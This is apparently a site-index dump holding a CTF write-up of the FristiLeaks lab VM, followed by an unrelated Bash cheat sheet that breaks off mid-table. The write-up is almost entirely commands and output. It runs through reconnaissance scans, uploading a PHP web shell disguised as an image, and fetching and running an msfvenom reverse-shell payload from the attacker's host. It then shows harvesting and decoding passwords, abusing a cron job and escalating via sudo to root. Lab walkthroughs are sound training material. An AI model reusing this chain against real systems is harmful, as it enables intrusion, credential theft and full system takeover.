cpe:/o:linux:linux_kernel:3 OS details: Linux 2.6.32, Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13 Network Distance: 1 hop TRACEROUTE HOP RTT ADDRESS 1 0.61 ms 192.168.88.133 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 160.46 seconds  nikto   Related files    nikto -h 192.168.88.133 - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 192.168.88.133 + Target Hostname: 192.168.88.133 + Target Port: 80 + Start Time: 2020-01-05 12:51:52 (GMT1) --------------------------------------------------------------------------- + Server: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3 + Server may leak inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov 17 19:45:47 2015 + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + Entry '/cola/' in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry '/sisi/' in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry '/beer/' in robots.txt returned a non-forbidden or redirect HTTP code (200) + \u0026quot;robots.txt\u0026quot; contains 3 entries which should be manually viewed. + PHP/5.3.3 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch. + Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch. + Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST + OSVDB-3268: /icons/: Directory indexing found. + OSVDB-3268: /images/: Directory indexing found. + OSVDB-3233: /icons/README: Apache default file found. + 8727 requests: 0 error(s) and 15 item(s) reported on remote host + End Time: 2020-01-05 12:52:13 (GMT1) (21 seconds) --------------------------------------------------------------------------- + 1 host(s) tested  gobuster   Related files    ~/go/bin/gobuster dir -u http://192.168.88.133 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sql,html,txt -t 40 -e =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://192.168.88.133 [+] Threads: 40 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,sql,html,txt [+] Expanded: true [+] Timeout: 10s =============================================================== 2020/01/04 23:45:08 Starting gobuster =============================================================== http://192.168.88.133/index.html (Status: 200) http://192.168.88.133/images (Status: 301) http://192.168.88.133/robots.txt (Status: 200) http://192.168.88.133/beer (Status: 301) http://192.168.88.133/cola (Status: 301) =============================================================== 2020/01/04 23:49:44 Finished ===============================================================  FRISTI MAN http://192.168.88.133/fristi/\nusername in code\neezeepz\nbase64 image in code\nkeKkeKKeKKeKkEkkEk\nlogin -\u0026gt; eezeepz:keKkeKKeKKeKkEkkEk\nExploit   Related files   p_shell.php  (0 kb)    Upload shell.php.jpg (https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php)\nUploading, please wait The file has been uploaded to /uploads  http://192.168.88.133/fristi/uploads/shell.php.jpg\np0wny@shell:…/fristi/uploads# whoami apache p0wny@shell:…/fristi/uploads# uname -na Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux  p0wny@shell:…/fristi/uploads# cat /etc/passwd root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin saslauth:x:499:76:Saslauthd user:/var/empty/saslauth:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin apache:x:48:48:Apache:/var/www:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash vboxadd:x:498:1::/var/run/vboxadd:/bin/false eezeepz:x:500:500::/home/eezeepz:/bin/bash admin:x:501:501::/home/admin:/bin/bash fristigod:x:502:502::/var/fristigod:/bin/bash fristi:x:503:100::/var/www:/sbin/nologin  p0wny@shell:/home/admin# cat /etc/group root:x:0: bin:x:1:bin,daemon daemon:x:2:bin,daemon sys:x:3:bin,adm adm:x:4:adm,daemon tty:x:5: disk:x:6: lp:x:7:daemon mem:x:8: kmem:x:9: wheel:x:10: mail:x:12:mail,postfix uucp:x:14: man:x:15: games:x:20: gopher:x:30: video:x:39: dip:x:40: ftp:x:50: lock:x:54: audio:x:63: nobody:x:99: users:x:100: floppy:x:19: vcsa:x:69: utmp:x:22: utempter:x:35: cdrom:x:11: tape:x:33: dialout:x:18: saslauth:x:76: postdrop:x:90: postfix:x:89: fuse:x:499: sshd:x:74: apache:x:48: mysql:x:27: vboxsf:x:498: eezeepz:x:500: admin:x:501: fristigod:x:502:fristi  p0wny@shell:…/fristi/uploads# netstat -tulnp (No info could be read for \u0026quot;-p\u0026quot;: geteuid()=48 but you should be root.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN - tcp 0 0 :::80 :::* LISTEN - udp 0 0 0.0.0.0:68 0.0.0.0:* -  p0wny@shell:…/fristi/uploads# ps aux | grep root root 1 0.0 0.1 19232 1492 ? Ss 18:38 0:01 /sbin/init root 2 0.0 0.0 0 0 ? S 18:38 0:00 [kthreadd] root 3 0.0 0.0 0 0 ? S 18:38 0:00 [migration/0] root 4 0.0 0.0 0 0 ? S 18:38 0:00 [ksoftirqd/0] root 5 0.0 0.0 0 0 ? S 18:38 0:00 [stopper/0] root 6 0.0 0.0 0 0 ? S 18:38 0:00 [watchdog/0] root 7 0.0 0.0 0 0 ? S 18:38 0:00 [migration/1] root 8 0.0 0.0 0 0 ? S 18:38 0:00 [stopper/1] root 9 0.0 0.0 0 0 ? S 18:38 0:00 [ksoftirqd/1] root 10 0.0 0.0 0 0 ? S 18:38 0:00 [watchdog/1] root 11 0.0 0.0 0 0 ? S 18:38 0:00 [events/0] root 12 0.1 0.0 0 0 ? S 18:38 0:04 [events/1] root 13 0.0 0.0 0 0 ? S 18:38 0:00 [events/0] root 14 0.0 0.0 0 0 ? S 18:38 0:00 [events/1] root 15 0.0 0.0 0 0 ? S 18:38 0:00 [events_long/0] root 16 0.0 0.0 0 0 ? S 18:38 0:00 [events_long/1] root 17 0.0 0.0 0 0 ? S 18:38 0:00 [events_power_ef] root 18 0.0 0.0 0 0 ? S 18:38 0:00 [events_power_ef] root 19 0.0 0.0 0 0 ? S 18:38 0:00 [cgroup] root 20 0.0 0.0 0 0 ? S 18:38 0:00 [khelper] root 21 0.0 0.0 0 0 ? S 18:38 0:00 [netns] root 22 0.0 0.0 0 0 ? S 18:38 0:00 [async/mgr] root 23 0.0 0.0 0 0 ? S 18:38 0:00 [pm] root 24 0.0 0.0 0 0 ? S 18:38 0:00 [sync_supers] root 25 0.0 0.0 0 0 ? S 18:38 0:00 [bdi-default] root 26 0.0 0.0 0 0 ? S 18:38 0:00 [kintegrityd/0] root 27 0.0 0.0 0 0 ? S 18:38 0:00 [kintegrityd/1] root 28 0.0 0.0 0 0 ? S 18:38 0:00 [kblockd/0] root 29 0.0 0.0 0 0 ? S 18:38 0:00 [kblockd/1] root 30 0.0 0.0 0 0 ? S 18:38 0:00 [kacpid] root 31 0.0 0.0 0 0 ? S 18:38 0:00 [kacpi_notify] root 32 0.0 0.0 0 0 ? S 18:38 0:00 [kacpi_hotplug] root 33 0.0 0.0 0 0 ? S 18:38 0:00 [ata_aux] root 34 0.0 0.0 0 0 ? S 18:38 0:00 [ata_sff/0] root 35 0.0 0.0 0 0 ? S 18:38 0:00 [ata_sff/1] root 36 0.0 0.0 0 0 ? S 18:38 0:00 [ksuspend_usbd] root 37 0.0 0.0 0 0 ? S 18:38 0:00 [khubd] root 38 0.0 0.0 0 0 ? S 18:38 0:00 [kseriod] root 39 0.0 0.0 0 0 ? S 18:38 0:00 [md/0] root 40 0.0 0.0 0 0 ? S 18:38 0:00 [md/1] root 41 0.0 0.0 0 0 ? S 18:38 0:00 [md_misc/0] root 42 0.0 0.0 0 0 ? S 18:38 0:00 [md_misc/1] root 43 0.0 0.0 0 0 ? S 18:38 0:00 [linkwatch] root 45 0.0 0.0 0 0 ? S 18:38 0:00 [khungtaskd] root 46 0.0 0.0 0 0 ? S 18:38 0:00 [kswapd0] root 47 0.0 0.0 0 0 ? SN 18:38 0:00 [ksmd] root 48 0.0 0.0 0 0 ? SN 18:38 0:00 [khugepaged] root 49 0.0 0.0 0 0 ? S 18:38 0:00 [aio/0] root 50 0.0 0.0 0 0 ? S 18:38 0:00 [aio/1] root 51 0.0 0.0 0 0 ? S 18:38 0:00 [crypto/0] root 52 0.0 0.0 0 0 ? S 18:38 0:00 [crypto/1] root 59 0.0 0.0 0 0 ? S 18:38 0:00 [kthrotld/0] root 60 0.0 0.0 0 0 ? S 18:38 0:00 [kthrotld/1] root 61 0.0 0.0 0 0 ? S 18:38 0:00 [pciehpd] root 63 0.0 0.0 0 0 ? S 18:38 0:00 [kpsmoused] root 64 0.0 0.0 0 0 ? S 18:38 0:00 [usbhid_resumer] root 65 0.0 0.0 0 0 ? S 18:38 0:00 [deferwq] root 98 0.0 0.0 0 0 ? S 18:38 0:00 [kdmremove] root 99 0.0 0.0 0 0 ? S 18:38 0:00 [kstriped] root 228 0.0 0.0 0 0 ? S 18:38 0:00 [scsi_eh_0] root 236 0.0 0.0 0 0 ? S 18:38 0:00 [scsi_eh_1] root 438 0.0 0.0 0 0 ? S 18:38 0:00 [kdmflush] root 440 0.0 0.0 0 0 ? S 18:38 0:00 [kdmflush] root 458 0.0 0.0 0 0 ? S 18:38 0:00 [jbd2/dm-0-8] root 459 0.0 0.0 0 0 ? S 18:38 0:00 [ext4-dio-unwrit] root 540 0.0 0.1 11072 1272 ? S\u0026lt;s 18:38 0:00 /sbin/udevd -d root 822 0.0 0.0 0 0 ? S 18:38 0:00 [vmmemctl] root 991 0.0 0.0 0 0 ? S 18:38 0:00 [jbd2/sda1-8] root 992 0.0 0.0 0 0 ? S 18:38 0:00 [ext4-dio-unwrit] root 1024 0.0 0.0 0 0 ? S 18:38 0:00 [kauditd] root 1220 0.0 0.0 0 0 ? S 18:38 0:01 [flush-253:0] root 1282 0.0 0.0 9120 972 ? Ss 18:38 0:00 /sbin/dhclient -1 -q -lf /var/lib/dhclient/dhclient-eth0.leases -pf /var/run/dhclient-eth0.pid eth0 root 1350 0.0 0.0 27596 796 ? S\u0026lt;sl 18:38 0:00 auditd root 1372 0.0 0.1 249084 1604 ? Sl 18:38 0:00 /sbin/rsyslogd -i /var/run/syslogd.pid -c 5 root 1444 0.0 0.1 11068 1180 ? S\u0026lt; 18:38 0:00 /sbin/udevd -d root 1516 0.0 0.1 108168 1568 ? S 18:38 0:00 /bin/sh /usr/bin/mysqld_safe --datadir=/var/lib/mysql --socket=/var/lib/mysql/mysql.sock --pid-file=/var/run/mysqld/mysqld.pid --basedir=/usr --user=mysql root 1645 0.0 1.0 251996 11020 ? Ss 18:38 0:00 /usr/sbin/httpd root 1665 0.0 0.1 116864 1224 ? Ss 18:38 0:00 crond root 1678 0.0 0.0 4064 600 tty1 Ss+ 18:38 0:00 /sbin/mingetty /dev/tty1 root 1680 0.0 0.0 4064 600 tty2 Ss+ 18:38 0:00 /sbin/mingetty /dev/tty2 root 1682 0.0 0.1 11068 1176 ? S\u0026lt; 18:38 0:00 /sbin/udevd -d root 1683 0.0 0.0 4064 600 tty3 Ss+ 18:38 0:00 /sbin/mingetty /dev/tty3 root 1685 0.0 0.0 4064 596 tty4 Ss+ 18:38 0:00 /sbin/mingetty /dev/tty4 root 1687 0.0 0.0 4064 596 tty5 Ss+ 18:38 0:00 /sbin/mingetty /dev/tty5 root 1689 0.0 0.0 4064 596 tty6 Ss+ 18:38 0:00 /sbin/mingetty /dev/tty6 root 2450 0.0 0.0 19052 964 ? Ss 19:01 0:00 /usr/sbin/anacron -s  p0wny@shell:…/fristi/uploads# python --version    Related files   r_s.py  (0 kb)    msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.88.128 lport=4444 -f raw -o r_s.py [-] No platform was selected, choosing Msf::Module::Platform::Python from the payload [-] No arch selected, selecting arch: python from the payload No encoder or badchars specified, outputting raw payload Payload size: 454 bytes Saved as: r_s.py python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... msf5 exploit(multi/handler) \u0026gt; show options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (python/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.88.128 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port  p0wny@shell:…/fristi/uploads# wget http://192.168.88.128:8000/r_s.py --2020-01-04 19:23:00-- http://192.168.88.128:8000/r_s.py Connecting to 192.168.88.128:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 454 [text/plain] Saving to: `r_s.py' 0K 100% 73.4M=0s 2020-01-04 19:23:00 (73.4 MB/s) - `r_s.py' saved [454/454] p0wny@shell:…/fristi/uploads# python r_s.py  msf5 exploit(multi/handler) \u0026gt; run [*] Started reverse TCP handler on 192.168.88.128:4444 [*] Sending stage (53755 bytes) to 192.168.88.133 [*] Meterpreter session 1 opened (192.168.88.128:4444 -\u0026gt; 192.168.88.133:45693) at 2020-01-05 13:15:34 +0100 [*] Sending stage (53755 bytes) to 192.168.88.133 [*] Meterpreter session 2 opened (192.168.88.128:4444 -\u0026gt; 192.168.88.133:45694) at 2020-01-05 13:15:35 +0100 meterpreter \u0026gt; ls Listing: /var/www/html/fristi ============================= Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100644/rw-r--r-- 1310 fil 2015-11-25 10:11:03 +0100 checklogin.php 100644/rw-r--r-- 1216 fil 2015-11-25 10:11:03 +0100 do_upload.php 100644/rw-r--r-- 1396 fil 2015-11-25 10:11:03 +0100 index.php 100644/rw-r--r-- 191 fil 2015-11-25 10:11:03 +0100 login_success.php 100644/rw-r--r-- 45 fil 2015-11-25 10:11:03 +0100 logout.php 100644/rw-r--r-- 1396 fil 2015-11-25 10:11:03 +0100 main_login.php 100644/rw-r--r-- 131736 fil 2015-11-25 10:11:03 +0100 pic.b64 100644/rw-r--r-- 1642 fil 2015-11-25 10:11:03 +0100 pic2.b64 100644/rw-r--r-- 372 fil 2015-11-25 10:11:03 +0100 upload.php 40777/rwxrwxrwx 4096 dir 2020-01-05 01:23:00 +0100 uploads meterpreter \u0026gt; cat checklogin.php \u0026lt;?php ob_start(); $host=\u0026quot;localhost\u0026quot;; // Host name $username=\u0026quot;eezeepz\u0026quot;; // Mysql username $password=\u0026quot;4ll3maal12#\u0026quot;; // Mysql password $db_name=\u0026quot;hackmenow\u0026quot;; // Database name $tbl_name=\u0026quot;members\u0026quot;; // Table name  eezeepz:4ll3maal12#\nmeterpreter \u0026gt; shell Process 2952 created. Channel 50 created. sh: no job control in this shell sh-4.1$ mysql -u eezeepz -p Enter password: 4ll3maal12# Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 15 Server version: 5.1.73 Source distribution Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. mysql\u0026gt; use hackmenow; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; show tables; +---------------------+ | Tables_in_hackmenow | +---------------------+ | members | +---------------------+ 1 row in set (0.00 sec) mysql\u0026gt; select * from members; +----+----------+--------------------+ | id | username | password | +----+----------+--------------------+ | 1 | eezeepz | keKkeKKeKKeKkEkkEk | +----+----------+--------------------+ 1 row in set (0.00 sec)  sh-4.1$ pwd /home/eezeepz sh-4.1$ ls MAKEDEV chown hostname netreport taskset weak-modules cbq clock hwclock netstat tc wipefs cciss_id consoletype kbd_mode new-kernel-pkg telinit xfs_repair cfdisk cpio kill nice touch ypdomainname chcpu cryptsetup killall5 nisdomainname tracepath zcat chgrp ctrlaltdel kpartx nologin tracepath6 zic chkconfig cut nameif notes.txt true chmod halt nano tar tune2fs sh-4.1$ cat notes.txt Yo EZ, I made it possible for you to do some automated checks, but I did only allow you access to /usr/bin/* system binaries. I did however copy a few extra often needed commands to my homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those from /home/admin/ Dont forget to specify the full path for each binary! Just put a file called \u0026quot;runthis\u0026quot; in /tmp/, each line one command. The output goes to the file \u0026quot;cronresult\u0026quot; in /tmp/. It should run every minute with my account privileges. - Jerry  p0wny@shell:…/fristi/uploads# cd /home/ p0wny@shell:/home# ls admin eezeepz fristigod p0wny@shell:/home# cd eezeepz p0wny@shell:/home/eezeepz# ls MAKEDEV cbq cciss_id cfdisk chcpu chgrp chkconfig chmod chown clock consoletype cpio cryptsetup ctrlaltdel cut halt hostname hwclock kbd_mode kill killall5 kpartx nameif nano netreport netstat new-kernel-pkg nice nisdomainname nologin notes.txt tar taskset tc telinit touch tracepath tracepath6 true tune2fs weak-modules wipefs xfs_repair ypdomainname zcat zic p0wny@shell:/home/eezeepz# cat notes.txt Yo EZ, I made it possible for you to do some automated checks, but I did only allow you access to /usr/bin/* system binaries. I did however copy a few extra often needed commands to my homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those from /home/admin/ Dont forget to specify the full path for each binary! Just put a file called \u0026quot;runthis\u0026quot; in /tmp/, each line one command. The output goes to the file \u0026quot;cronresult\u0026quot; in /tmp/. It should run every minute with my account privileges. - Jerry p0wny@shell:/tmp# echo '/home/admin/chmod 777 /home/ -R' \u0026gt; runthis p0wny@shell:/tmp# cat cronresult executing: /home/admin/chmod 777 /home/ -R p0wny@shell:/home# ls -la total 28 drwxr-xr-x. 5 root root 4096 Nov 19 2015 . dr-xr-xr-x. 22 root root 4096 Jan 4 18:38 .. drwxrwxrwx. 2 admin admin 4096 Nov 19 2015 admin drwx---r-x. 5 eezeepz eezeepz 12288 Nov 18 2015 eezeepz drwx------ 2 fristigod fristigod 4096 Nov 19 2015 fristigod p0wny@shell:/home# cd admin p0wny@shell:/home/admin# ls cat chmod cronjob.py cryptedpass.txt cryptpass.py df echo egrep grep ps whoisyourgodnow.txt p0wny@shell:/home/admin# cat cryptedpass.txt mVGZ3O3omkJLmy2pcuTq p0wny@shell:/home/admin# cat whoisyourgodnow.txt =RFn0AKnlMHMPIzpyuTI0ITG p0wny@shell:/home/admin# cat cryptpass.py #Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn import base64,codecs,sys def encodeString(str): base64string= base64.b64encode(str) return codecs.encode(base64string[::-1], 'rot13') cryptoResult=encodeString(sys.argv[1]) print cryptoResult rot13, reverse, base64 decode codecs.encode(base64string[::-1], 'rot13') mVGZ3O3omkJLmy2pcuTq = thisisalsopw123 =RFn0AKnlMHMPIzpyuTI0ITG = LetThereBeFristi! p0wny@shell:/home/admin# su fristigod standard in must be a tty  meterpreter \u0026gt; shell Process 3464 created. Channel 1 created. sh: no job control in this shell sh-4.1$ su fristigod Password: LetThereBeFristi! bash: no job control in this shell bash-4.1$ find / -user fristigod \u0026gt;\u0026gt; fristi_files.txt bash-4.1$ cat fristi_files.txt ... /proc/3576/coredump_filter /proc/3576/io /home/admin/fristi_files.txt /home/admin/whoisyourgodnow.txt /home/fristigod /home/fristigod/.bash_logout /home/fristigod/.bashrc /home/fristigod/.bash_profile /var/spool/mail/fristigod /var/fristigod /var/fristigod/.bash_history /var/fristigod/.secret_admin_stuff ash-4.1$ cd /var/fristigod bash-4.1$ ls -la total 16 drwxr-x--- 3 fristigod fristigod 4096 Nov 25 2015 . drwxr-xr-x. 19 root root 4096 Nov 19 2015 .. -rw------- 1 fristigod fristigod 864 Nov 25 2015 .bash_history drwxrwxr-x. 2 fristigod fristigod 4096 Nov 25 2015 .secret_admin_stuff -bash-4.1$ cat .bash_history cat .bash_history ls pwd ls -lah cd .secret_admin_stuff/ ls ./doCom ./doCom test sudo ls exit cd .secret_admin_stuff/ ls ./doCom sudo -u fristi ./doCom ls / sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls / exit sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls / sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom exit sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom exit sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom sudo /var/fristigod/.secret_admin_stuff/doCom exit sudo /var/fristigod/.secret_admin_stuff/doCom sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom exit sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom exit sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom groups ls -lah usermod -G fristigod fristi exit sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom less /var/log/secure e Fexit exit exit bash-4.1$ cd ./.secret_admin_stuff bash-4.1$ ls -lA total 8 -rwsr-sr-x 1 root root 7529 Nov 25 2015 doCom bash-4.1$ sudo -u fristi ./doCom ls / sudo: sorry, you must have a tty to run sudo bash-4.1$ python -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;)' bash-4.1$ sudo -u fristi ./doCom ls / [sudo] password for fristigod: LetThereBeFristi! bin dev home lib64 media opt root selinux sys usr boot etc lib lost+found mnt proc sbin srv tmp var bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom usermod -aG root fristigod bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom usermod -aG root fristigod ot fristigodti /var/fristigod/.secret_admin_stuff/doCom usermod -aG ro bash-4.1$ cat /etc/group cat /etc/group root:x:0:fristigod bash-4.1$ sudo bash sudo bash Sorry, user fristigod is not allowed to execute '/bin/bash' as root on localhost.localdomain. bash-4.1$ sudo python -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;)' sudo python -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;)' Sorry, user fristigod is not allowed to execute '/usr/bin/python -c import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;)' as root on localhost.localdomain. bash-4.1$ sudo -l [sudo] password for fristigod: LetThereBeFristi!Matching Defaults entries for fristigod on this host: requiretty, !visiblepw, always_set_home, env_reset, env_keep=\u0026quot;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS\u0026quot;, env_keep+=\u0026quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\u0026quot;, env_keep+=\u0026quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES\u0026quot;, env_keep+=\u0026quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\u0026quot;, env_keep+=\u0026quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY\u0026quot;, secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/binUser fristigod may run the following commands on this host: (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash bash-4.1# id id uid=0(root) gid=100(users) groups=100(users),502(fristigod)  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/programming/bash/",
	"title": "Bash",
	"tags": ["Programming"],
	"description": "Bash scripting.",
	"content": "Bash Getting started Example #!/usr/bin/env bash NAME=\u0026quot;John\u0026quot; echo \u0026quot;Hello $NAME!\u0026quot;  Variables NAME=\u0026quot;John\u0026quot; echo $NAME echo \u0026quot;$NAME\u0026quot; echo \u0026quot;${NAME}!\u0026quot;  String quotes NAME=\u0026quot;John\u0026quot; echo \u0026quot;Hi $NAME\u0026quot; #=\u0026gt; Hi John echo 'Hi $NAME' #=\u0026gt; Hi $NAME  Shell execution echo \u0026quot;I'm in $(pwd)\u0026quot; echo \u0026quot;I'm in `pwd`\u0026quot; # Same  See Command substitution\nConditional execution git commit \u0026amp;\u0026amp; git push git commit || echo \u0026quot;Commit failed\u0026quot;  Function get_name() { echo \u0026quot;John\u0026quot; } echo \u0026quot;You are $(get_name)\u0026quot;  Conditional if [[ -z \u0026quot;$string\u0026quot; ]]; then echo \u0026quot;String is empty\u0026quot; elif [[ -n \u0026quot;$string\u0026quot; ]]; then echo \u0026quot;String is not empty\u0026quot; fi  Strict mode set -euo pipefail IFS=$'\\n\\t'  See: Unofficial bash strict mode\nBrace expansion echo {A,B}.js     Code Description     {A,B} Same as A B   {A,B}.js Same as A.js B.js   {1..5} Same as 1 2 3 4 5    See: Brace expansion\nParameter expansions Basics name=\u0026quot;John\u0026quot; echo ${name} echo ${name/J/j} #=\u0026gt; \u0026quot;john\u0026quot; (substitution) echo ${name:0:2} #=\u0026gt; \u0026quot;Jo\u0026quot; (slicing) echo ${name::2} #=\u0026gt; \u0026quot;Jo\u0026quot; (slicing) echo ${name::-1} #=\u0026gt; \u0026quot;Joh\u0026quot; (slicing) echo ${name:(-1)} #=\u0026gt; \u0026quot;n\u0026quot; (slicing from right) echo ${name:(-2):1} #=\u0026gt; \u0026quot;h\u0026quot; (slicing from right) echo ${food:-Cake} #=\u0026gt; $food or \u0026quot;Cake\u0026quot;  length=2 echo ${name:0:length} #=\u0026gt; \u0026quot;Jo\u0026quot;  See: Parameter expansion\nSTR=\u0026quot;/path/to/foo.cpp\u0026quot; echo ${STR%.cpp} # /path/to/foo echo ${STR%.cpp}.o # /path/to/foo.o echo ${STR####*.} # cpp (extension) echo ${STR####*/} # foo.cpp (basepath) echo ${STR#*/} # path/to/foo.cpp echo ${STR####*/} # foo.cpp echo ${STR/foo/bar} # /path/to/bar.cpp  STR=\u0026quot;Hello world\u0026quot; echo ${STR:6:5} # \u0026quot;world\u0026quot; echo ${STR:-5:5} # \u0026quot;world\u0026quot;  SRC=\u0026quot;/path/to/foo.cpp\u0026quot; BASE=${SRC####*/} #=\u0026gt; \u0026quot;foo.cpp\u0026quot; (basepath) DIR=${SRC%$BASE} #=\u0026gt; \u0026quot;/path/to/\u0026quot; (dirpath)  Substitution    Code Description     ${FOO%suffix} Remove suffix   ${FOO#prefix} Remove prefix       ${FOO%%suffix} Remove long suffix   ${FOO####prefix} Remove long prefix       ${FOO/from/to} Replace first match   ${FOO//from/to} Replace all       ${FOO/%from/to} Replace suffix   ${FOO/#from/to} Replace prefix    Comments # Single line comment  : ' This is a multi line comment '  Substrings    Code Description     ${FOO:0:3} Substring (position, length)   ${FOO:-3:3} Substring from the right    Length    Code Description     ${#FOO} Length of $FOO    Manipulation STR=\u0026quot;HELLO WORLD!\u0026quot; echo ${STR,} #=\u0026gt; \u0026quot;hELLO WORLD!\u0026quot; (lowercase 1st letter) echo ${STR,,} #=\u0026gt; \u0026quot;hello world!\u0026quot; (all lowercase) STR=\u0026quot;hello world!\u0026quot; echo ${STR^} #=\u0026gt; \u0026quot;Hello world!\u0026quot; (uppercase 1st letter) echo ${STR^^} #=\u0026gt; \u0026quot;HELLO WORLD!\u0026quot; (all uppercase)  Default values    Code Description     ${FOO:-val} $FOO, or val if not set   ${FOO:=val} Set $FOO to val if not set   ${FOO:+val} val if $FOO is set   ${FOO:?message} Show error message and exit if $FOO is not set    The : is optional (eg, ${FOO=word} works)\nLoops Basic for loop for i in /etc/rc.*; do echo $i done  C-like for loop for ((i = 0 ; i \u0026lt; 100 ; i++)); do echo $i done  Ranges for i in {1..5}; do echo \u0026quot;Welcome $i\u0026quot; done  With step size for i in {5..50..5}; do echo \u0026quot;Welcome $i\u0026quot; done  Reading lines \u0026lt; file.txt | while read line; do echo $line done  Forever while true; do ··· done  Functions Defining functions myfunc() { echo \u0026quot;hello $1\u0026quot; }  # Same as above (alternate syntax) function myfunc() { echo \u0026quot;hello $1\u0026quot; }  myfunc \u0026quot;John\u0026quot;  Returning values myfunc() { local myresult='some value' echo $myresult }  result=\u0026quot;$(myfunc)\u0026quot;  Raising errors myfunc() { return 1 }  if myfunc; then echo \u0026quot;success\u0026quot; else echo \u0026quot;failure\u0026quot; fi  Arguments    Expression Description     $# Number of arguments   $* All arguments   $@ All arguments, starting from first   $1 First argument    See Special parameters.\nConditionals Conditions Note that [[ is actually a command/program that returns either 0 (true) or 1 (false). Any program that obeys the same logic (like all base utils, such as grep(1) or ping(1)) can be used as condition, see examples.\n   Condition Description     [[ -z STRING ]] Empty string   [[ -n STRING ]] Not empty string   [[ STRING == STRING ]] Equal   [[ STRING != STRING ]] Not Equal       [[ NUM -eq NUM ]] Equal   [[ NUM -ne NUM ]] Not equal   [[ NUM -lt NUM ]] Less than   [[ NUM -le NUM ]] Less than or equal   [[ NUM -gt NUM ]] Greater than   [[ NUM -ge NUM ]] Greater than or 